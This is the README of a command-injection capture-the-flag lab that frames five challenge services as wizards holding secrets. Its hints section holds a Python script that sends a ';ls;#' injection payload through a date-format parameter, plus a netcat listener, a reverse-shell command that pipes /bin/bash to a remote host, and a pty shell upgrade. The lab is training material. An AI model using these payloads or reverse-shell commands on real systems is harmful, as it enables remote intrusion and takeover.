# Injections

```
              .7 
            .'/       
           / /        
          / /
         / /          
        / /        So you woke up down here in some sorcery land. You met a dead guy.     
       / /         Surprisingly, he started to talk to you:
      / /
     / /           - To escape from this cursed place
    / /              Steal secrets from five wizards
  __|/               Here's The Map, so you can find them
,-\__\              
|f-"Y\|             
\()7L/
 cgD                            __ _
 |\(                          .'  Y '>,
  \ \                        / _   _   \
   \\\                       )(_) (_)(|}
    \\\                      {  4A   } /
     \\\                      \uLuJJ/\l
      \\\                     |3    p)/
       \\\___ __________      /nnm_n//
       c7___-__,__-)\,__)(".  \_>-<_/D
                  //V     \_"-._.__G G_c__.-__<"/ ( \
                         <"-._>__-,G_.___)\   \7\
                        ("-.__.| \"<.__.-" )   \ \
                        |"-.__"\  |"-.__.-".\   \ \
                        ("-.__"". \"-.__.-".|    \_\
                        \"-.__""|!|"-.__.-".)     \ \
                         "-.__""\_|"-.__.-"./      \ l
                          ".__""">G>-.__.-">       .--,_
                              ""  G
```


# The Map

* [first charmer](http://80.211.144.146:7331/magic1), who pings. Secret on filesystem.
* [second sorcerer](http://80.211.144.146:7332/magic2), who always sits at the council. To get the secret, run `get_flag` binary. 
* [third enchanter](http://80.211.144.146:7333/magic3), elixirs master. Secret in database, guarded by `Guard of the secret`.
* [fourth magician](http://80.211.144.146:7334/magic4), who keeps The Book of Spells. Secret is the second spell.
* [fifth wizard](http://80.211.144.146:7335/magic5), who can do Math. Secret on filesystem.


# lab setup
* local:
    ```
    cd lab3 && docker-compose up
    ```
* remote at: [https://80.211.144.146:7331/magic1](https://80.211.144.146:7331/magic1) etc

# lab solutions
* Not yet

# hints
```py
import requests
import uuid

url = 'http://80.211.144.146:7332/magic2'
proxies = {'http':'http://localhost:8080'}


def do_exec(payload):
    resp = requests.get(url+'/chat/write',
                        params={'msg': 'test solve', 'nick': 'X',
                        'date': payload[1], 'dateFormat':payload[0]},
                        proxies=proxies)
    print(resp.text)


if __name__ == "__main__":
    unique_filename = str(uuid.uuid4())
    prefix = "%H\\"
    payload1 = ";ls;#"

    do_exec([prefix, payload1])
```
```
ip: 80.211.144.146
ssh -p 22 agh@80.211.144.146

nc -nvlp 4444
system("netcat 80.211.144.146 4444 -e /bin/bash")
python -c 'import pty; pty.spawn("/bin/bash");'
```
